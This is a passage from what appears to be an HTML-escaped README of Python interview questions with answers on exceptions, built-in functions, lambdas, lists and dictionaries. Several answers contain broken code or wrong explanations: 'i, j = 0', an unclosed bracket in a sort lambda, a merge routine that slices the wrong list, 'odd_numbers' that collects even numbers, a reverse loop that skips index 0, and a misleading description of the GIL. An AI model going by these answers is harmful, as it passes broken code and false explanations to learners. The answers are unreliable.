error? What is an exception? What types of exceptions are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;#  Note that you generally don&#39;t need to know the compiling process but knowing where everything comes from&#xA;#  and giving complete answers shows that you truly know what you are talking about.&#xA;&#xA;Generally, every compiling process have a two steps.&#xA;    - Analysis&#xA;    - Code Generation.&#xA;&#xA;    Analysis can be broken into:&#xA;        1. Lexical analysis   (Tokenizes source code)&#xA;        2. Syntactic analysis (Check whether the tokens are legal or not, tldr, if syntax is correct)&#xA;&#xA;               for i in &#39;foo&#39;&#xA;                          ^&#xA;             SyntaxError: invalid syntax&#xA;&#xA;        We missed &#39;:&#39;&#xA;&#xA;&#xA;        3. Semantic analysis  (Contextual analysis, legal syntax can still trigger errors, did you try to divide by 0,&#xA;          hash a mutable object or use an undeclared function?)&#xA;&#xA;                 1/0&#xA;                ZeroDivisionError: division by zero&#xA;&#xA;    These three analysis steps are the responsible for error handlings.&#xA;&#xA;    The second step would be responsible for errors, mostly syntax errors, the most common error.&#xA;    The third step would be responsible for Exceptions.&#xA;&#xA;    As we have seen, Exceptions are semantic errors, there are many builtin Exceptions:&#xA;&#xA;        ImportError&#xA;        ValueError&#xA;        KeyError&#xA;        FileNotFoundError&#xA;        IndentationError&#xA;        IndexError&#xA;        ...&#xA;&#xA;    You can also have user defined Exceptions that have to inherit from the `Exception` class, directly or indirectly.&#xA;&#xA;    Basic example:&#xA;&#xA;    class DividedBy2Error(Exception):&#xA;        def __init__(self, message):&#xA;            self.message = message&#xA;&#xA;&#xA;    def division(dividend,divisor):&#xA;        if divisor == 2:&#xA;            raise DividedBy2Error(&#39;I dont want you to divide by 2!&#39;)&#xA;        return dividend / divisor&#xA;&#xA;    division(100, 2)&#xA;&#xA;    &amp;gt;&amp;gt;&amp;gt; __main__.DividedBy2Error: I dont want you to divide by 2!&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Exception Handling and how to use it in Python&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;&lt;strong&gt;Exceptions:&lt;/strong&gt; Errors detected during execution are called Exceptions.&lt;/p&gt; &lt;p&gt;&lt;strong&gt;Handling Exception:&lt;/strong&gt; When an error occurs, or exception as we call it, Python will normally stop and generate an error message.&lt;br&gt; Exceptions can be handled using &lt;code&gt;try&lt;/code&gt; and &lt;code&gt;except&lt;/code&gt; statement in python.&lt;/p&gt; &lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt; Following example asks the user for input until a valid integer has been entered. &lt;br&gt; If user enter a non-integer value it will raise exception and using except it will catch that exception and ask the user to enter valid integer again.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;while True:&#xA;    try:&#xA;        a = int(input(&#34;please enter an integer value: &#34;))&#xA;        break&#xA;    except ValueError:&#xA;        print(&#34;Ops! Please enter a valid integer value.&#34;)&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;For more details about errors and exceptions follow this &lt;a href=&#34;https://docs.python.org/3/tutorial/errors.html&#34;&gt;https://docs.python.org/3/tutorial/errors.html&lt;/a&gt;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the result of running the following function? &lt;pre&gt;&lt;code&gt;def true_or_false():&#xA;    try:&#xA;        return True&#xA;    finally:&#xA;        return False&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; False &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Python Built-in functions&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the following built-in functions (their purpose + use case example): &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;repr&lt;/li&gt; &#xA;   &lt;li&gt;any&lt;/li&gt; &#xA;   &lt;li&gt;all&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference between repr function and str?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the __call__ method?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;It is used to emulate callable objects. It allows a class instance to be called as a function.&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Example code:&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;pre&gt;&lt;code&gt;class Foo:&#xA;    def __init__(self: object) -&amp;gt;  None:&#xA;        pass&#xA;    def __call__(self: object) -&amp;gt; None:&#xA;        print(&#34;Called!&#34;)&#xA;&#xA;f = Foo()&#xA;f()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Result:&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;pre&gt;&lt;code&gt;Called!&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Do classes has the __call__ method as well? What for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What _ is used for in Python?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ol&gt;&#xA;  &lt;b&gt; &lt;li&gt;Translation lookup in i18n&lt;/li&gt; &lt;li&gt;Hold the result of the last executed expression or statement in the interactive interpreter.&lt;/li&gt; &lt;li&gt;As a general purpose &#34;throwaway&#34; variable name. For example: x, y, _ = get_data() (x and y are used but since we don&#39;t care about third variable, we &#34;threw it away&#34;). &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ol&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is GIL&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; Python Global Interpreter Lock (GIL) is a type of process lock which is used by python whenever it deals with processes. Generally, Python only uses only one thread to execute the set of written statements. This means that in python only one thread will be executed at a time &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Lambda? How is it used?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;A &lt;code&gt;lambda&lt;/code&gt; expression is an &#39;anonymous&#39; function, the difference from a normal defined function using the keyword `def`` is the syntax and usage.&lt;/p&gt; &lt;p&gt;The syntax is:&lt;/p&gt; &lt;p&gt;&lt;code&gt;lambda[parameters]: [expresion]&lt;/code&gt;&lt;/p&gt; &lt;p&gt;&lt;strong&gt;Examples:&lt;/strong&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;A lambda function add 10 with any argument passed.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;x = lambda a: a + 10&#xA;print(x(10))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;An addition function&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;addition = lambda x, y: x + y&#xA;print(addition(10, 20))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Squaring function&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;square = lambda x : x ** 2&#xA;print(square(5))&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Generally it is considered a bad practice under PEP 8 to assign a lambda expresion, they are meant to be used as parameters and inside of other defined functions.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Properties&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Are there private variables in Python? How would you make an attribute of a class, private?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the following: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;getter&lt;/li&gt; &#xA;   &lt;li&gt;setter&lt;/li&gt; &#xA;   &lt;li&gt;deleter&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is @property&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you swap values between two variables?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;x, y = y, x&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the following object&#39;s magic variables: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;strong&gt;dict&lt;/strong&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Write a function to return the sum of one or more numbers. The user will decide how many numbers to use&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;First you ask the user for the amount of numbers that will be use. Use a while loop that runs until amount_of_numbers becomes 0 through subtracting amount_of_numbers by one each loop. In the while loop you want ask the user for a number which will be added a variable each time the loop runs.&lt;/p&gt; &lt;pre&gt;&lt;code&gt;def return_sum():&#xA;&#x9;amount_of_numbers = int(input(&#34;How many numbers? &#34;))&#xA;&#x9;total_sum = 0&#xA;&#x9;while amount_of_numbers != 0:&#xA;&#x9;&#x9;num = int(input(&#34;Input a number. &#34;))&#xA;&#x9;&#x9;total_sum += num&#xA;&#x9;&#x9;amount_of_numbers -= 1&#xA;&#x9;return total_sum&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Print the average of [2, 5, 6]. It should be rounded to 3 decimal places&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;li = [2, 5, 6]&#xA;print(&#34;{0:.3f}&#34;.format(sum(li)/len(li)))&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Python - Lists&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a tuple in Python? What is it used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;A tuple is a built-in data type in Python. It&#39;s used for storing multiple items in a single variable. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;List, like a tuple, is also used for storing multiple items. What is then, the difference between a tuple and a list?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;List, as opposed to a tuple, is a mutable data type. It means we can modify it and at items to it. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to add the number 2 to the list &lt;code&gt;x = [1, 2, 3]&lt;/code&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;x.append(2)&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to get the last element of a list?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;some_list[-1]&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to add the items of [1, 2, 3] to the list [4, 5, 6]?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; x = [4, 5, 6] x.extend([1, 2, 3]) &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Don&#39;t use &lt;code&gt;append&lt;/code&gt; unless you would like the list as one item. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to remove the first 3 items from a list?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;my_list[0:3] = []&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to insert an item to the beginning of a list? What about two items?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;One item:&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;pre&gt;&lt;code&gt;numbers = [1, 2, 3, 4, 5]&#xA;numbers.insert(0, 0)&#xA;print(numbers)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Multiple items or list:&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;pre&gt;&lt;code&gt;numbers_1 = [2, 3, 4, 5]&#xA;numbers_2 = [0, 1]&#xA;numbers_1 = numbers_2 + numbers_1&#xA;print(numbers_1)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to sort list by the length of items?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;sorted_li = sorted(li, key=len)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Or without creating a new list:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;li.sort(key=len)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Do you know what is the difference between list.sort() and sorted(list)?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt; &lt;p&gt;sorted(list) will return a new list (original list doesn&#39;t change)&lt;/p&gt; &lt;/li&gt; &lt;li&gt; &lt;p&gt;list.sort() will return None but the list is change in-place&lt;/p&gt; &lt;/li&gt; &lt;li&gt; &lt;p&gt;sorted() works on any iterable (Dictionaries, Strings, ...)&lt;/p&gt; &lt;/li&gt; &lt;li&gt; &lt;p&gt;list.sort() is faster than sorted(list) in case of Lists &lt;/p&gt;&lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt;   &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Convert every string to an integer: &lt;code&gt;[[&#39;1&#39;, &#39;2&#39;, &#39;3&#39;], [&#39;4&#39;, &#39;5&#39;, &#39;6&#39;]]&lt;/code&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;nested_li = [[&#39;1&#39;, &#39;2&#39;, &#39;3&#39;], [&#39;4&#39;, &#39;5&#39;, &#39;6&#39;]]&#xA;[[int(x) for x in li] for li in nested_li]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to merge two sorted lists into one sorted list?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;sorted(li1 + li2)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Another way:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;i, j = 0&#xA;merged_li = []&#xA;&#xA;while i &amp;lt; len(li1) and j &amp;lt; len(li2):&#xA;    if li1[i] &amp;lt; li2[j]:&#xA;        merged_li.append(li1[i])&#xA;        i += 1&#xA;    else:&#xA;        merged_li.append(li2[j])&#xA;        j += 1&#xA;&#xA;merged_li = merged_li + merged_li[i:] + merged_li[j:]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to check if all the elements in a given lists are unique? so [1, 2, 3] is unique but [1, 1, 2, 3] is not unique because 1 exists twice&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt; &#xA; &lt;p&gt;There are many ways of solving this problem:&lt;br&gt; &lt;code&gt;# Note: :list and -&amp;gt; bool are just python typings, they are not needed for the correct execution of the algorithm. &lt;/code&gt;&lt;/p&gt; &#xA; &lt;p&gt;Taking advantage of sets and len:&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code&gt;def is_unique(l:list) -&amp;gt; bool:&#xA;    return len(set(l)) == len(l)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;This one is can be seen used in other programming languages.&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code&gt;def is_unique2(l:list) -&amp;gt; bool:&#xA;    seen = []&#xA;&#xA;    for i in l:&#xA;        if i in seen:&#xA;            return False&#xA;        seen.append(i)&#xA;    return True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;Here we just count and make sure every element is just repeated once.&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code&gt;def is_unique3(l:list) -&amp;gt; bool:&#xA;    for i in l:&#xA;        if l.count(i) &amp;gt; 1:&#xA;            return False&#xA;    return True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;This one might look more convulated but hey, one liners.&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code&gt;def is_unique4(l:list) -&amp;gt; bool:&#xA;    return all(map(lambda x: l.count(x) &amp;lt; 2, l))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You have the following function &lt;pre&gt;&lt;code&gt;def my_func(li = []):&#xA;    li.append(&#34;hmm&#34;)&#xA;    print(li)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;If we call it 3 times, what would be the result each call?&lt;/p&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;[&#39;hmm&#39;]&#xA;[&#39;hmm&#39;, &#39;hmm&#39;]&#xA;[&#39;hmm&#39;, &#39;hmm&#39;, &#39;hmm&#39;]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to iterate over a list?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;for item in some_list:&#xA;    print(item)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to iterate over a list with indexes?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;for i, item in enumerate(some_list):&#xA;    print(i)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to start list iteration from 2nd index?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Using range like this&lt;/p&gt; &lt;pre&gt;&lt;code&gt;for i in range(1, len(some_list)):&#xA;    some_list[i]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Another way is using slicing&lt;/p&gt; &lt;pre&gt;&lt;code&gt;for i in some_list[1:]:&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to iterate over a list in reverse order?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Method 1&lt;/p&gt; &lt;pre&gt;&lt;code&gt;for i in reversed(li):&#xA;    ...&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Method 2&lt;/p&gt; &lt;pre&gt;&lt;code&gt;n = len(li) - 1&#xA;while n &amp;gt; 0:&#xA;    ...&#xA;    n -= 1&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Sort a list of lists by the second item of each nested list&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;li = [[1, 4], [2, 1], [3, 9], [4, 2], [4, 5]]&#xA;&#xA;sorted(li, key=lambda l: l[1])&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;or&lt;/p&gt; &lt;pre&gt;&lt;code&gt;li.sort(key=lambda l: l[1)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Combine [1, 2, 3] and [&#39;x&#39;, &#39;y&#39;, &#39;z&#39;] so the result is [(1, &#39;x&#39;), (2, &#39;y&#39;), (3, &#39;z&#39;)]&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;nums = [1, 2, 3]&#xA;letters = [&#39;x&#39;, &#39;y&#39;, &#39;z&#39;]&#xA;&#xA;list(zip(nums, letters))&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is List Comprehension? Is it better than a typical loop? Why? Can you demonstrate how to use it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;From &lt;a href=&#34;https://docs.python.org/3/tutorial/datastructures.html#list-comprehensions&#34;&gt;Docs&lt;/a&gt;: &#34;List comprehensions provide a concise way to create lists. Common applications are to make new lists where each element is the result of some operations applied to each member of another sequence or iterable, or to create a subsequence of those elements that satisfy a certain condition.&#34;.&lt;/p&gt; &lt;p&gt;It&#39;s better because they&#39;re compact, faster and have better readability.&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;For loop:&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;pre&gt;&lt;code&gt;number_lists = [[1, 7, 3, 1], [13, 93, 23, 12], [123, 423, 456, 653, 124]]&#xA;odd_numbers = []&#xA;for number_list in number_lists:&#xA;    for number in number_list:&#xA;        if number % 2 == 0:&#xA;            odd_numbers.append(number)&#xA;print(odd_numbers)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;List comprehesion:&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;pre&gt;&lt;code&gt;number_lists = [[1, 7, 3, 1], [13, 93, 23, 12], [123, 423, 456, 653, 124]]&#xA;odd_numbers = [number for number_list in number_lists for number in number_list if number % 2 == 0]&#xA;print(odd_numbers)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You have the following list: &lt;code&gt;[{&#39;name&#39;: &#39;Mario&#39;, &#39;food&#39;: [&#39;mushrooms&#39;, &#39;goombas&#39;]}, {&#39;name&#39;: &#39;Luigi&#39;, &#39;food&#39;: [&#39;mushrooms&#39;, &#39;turtles&#39;]}]&lt;/code&gt; Extract all type of foods. Final output should be: {&#39;mushrooms&#39;, &#39;goombas&#39;, &#39;turtles&#39;}&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;brothers_menu =  \&#xA;[{&#39;name&#39;: &#39;Mario&#39;, &#39;food&#39;: [&#39;mushrooms&#39;, &#39;goombas&#39;]}, {&#39;name&#39;: &#39;Luigi&#39;, &#39;food&#39;: [&#39;mushrooms&#39;, &#39;turtles&#39;]}]&#xA;&#xA;# &#34;Classic&#34; Way&#xA;def get_food(brothers_menu) -&amp;gt; set:&#xA;    temp = []&#xA;&#xA;    for brother in brothers_menu:&#xA;        for food in brother[&#39;food&#39;]:&#xA;            temp.append(food)&#xA;&#xA;    return set(temp)&#xA;&#xA;# One liner way (Using list comprehension)&#xA;set([food for bro in x for food in bro[&#39;food&#39;]])&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Python - Dictionaries&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to create a dictionary?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;my_dict = dict(x=1, y=2) OR my_dict = {&#39;x&#39;: 1, &#39;y&#39;: 2} OR my_dict = dict([(&#39;x&#39;, 1), (&#39;y&#39;, 2)]) &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to remove a key from a dictionary?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;del my_dict[&#39;some_key&#39;] you can also use &lt;code&gt;my_dict.pop(&#39;some_key&#39;)&lt;/code&gt; which returns the value of the key. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to sort a dictionary by values?&lt;/summary&gt;&#xA; 